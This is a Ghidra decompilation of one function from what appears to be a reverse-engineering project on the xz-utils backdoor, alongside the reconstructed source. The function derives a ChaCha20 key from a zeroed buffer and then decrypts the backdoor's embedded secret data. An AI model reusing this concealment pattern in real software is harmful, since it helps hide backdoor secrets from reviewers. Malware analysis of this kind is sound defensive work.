// /home/kali/xzre-ghidra/xzregh/1081D0_secret_data_get_decrypted.c
// Function: secret_data_get_decrypted @ 0x1081D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_get_decrypted(u8 * output, global_context_t * ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief obtains a decrypted copy of the secret data
 *
 *   @param output output buffer that will receive the decrypted data
 *   @param ctx the global context (for secret data and function imports)
 *   @return BOOL TRUE if successful, FALSE otherwise
 *
 * Upstream implementation excerpt (xzre/xzre_code/secret_data_get_decrypted.c):
 *     struct key_buf {
 *     	u8 key[CHACHA20_KEY_SIZE];
 *     	u8 iv[CHACHA20_IV_SIZE];
 *     };
 *     
 *     BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx){
 *     	if(!output || !ctx || !ctx->imported_funcs){
 *     		return FALSE;
 *     	}
 *     	struct key_buf buf1 = {0}, buf2 = {0};
 *     	if(!chacha_decrypt(
 *     		(u8 *)&buf1, sizeof(buf1),
 *     		buf1.key, buf1.iv,
 *     		(u8 *)&buf2, ctx->imported_funcs)
 *     	){
 *     		return FALSE;
 *     	}
 *     
 *     	return chacha_decrypt(
 *     		ctx->secret_data, sizeof(ctx->secret_data),
 *     		buf2.key, buf2.iv,
 *     		output, ctx->imported_funcs);
 *     }
 */

BOOL secret_data_get_decrypted(u8 *output,global_context_t *ctx)

{
  imported_funcs_t *funcs;
  BOOL BVar1;
  long lVar2;
  u8 *puVar3;
  u8 auStack_b8 [32];
  u8 local_98 [16];
  u8 local_88 [32];
  u8 local_68 [80];
  
  if (output == (u8 *)0x0) {
    return 0;
  }
  if ((ctx != (global_context_t *)0x0) &&
     (funcs = ctx->imported_funcs, funcs != (imported_funcs_t *)0x0)) {
    puVar3 = auStack_b8;
    for (lVar2 = 0xc; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)puVar3 = 0;
      puVar3 = (u8 *)((long)puVar3 + 4);
    }
    puVar3 = local_88;
    for (lVar2 = 0x1c; lVar2 != 0; lVar2 = lVar2 + -1) {
      puVar3[0] = '\0';
      puVar3[1] = '\0';
      puVar3[2] = '\0';
      puVar3[3] = '\0';
      puVar3 = puVar3 + 4;
    }
    BVar1 = chacha_decrypt(auStack_b8,0x30,auStack_b8,local_98,local_88,funcs);
    if (BVar1 != 0) {
      BVar1 = chacha_decrypt(ctx->secret_data,0x39,local_88,local_68,output,ctx->imported_funcs);
      return (uint)(BVar1 != 0);
    }
  }
  return 0;
}

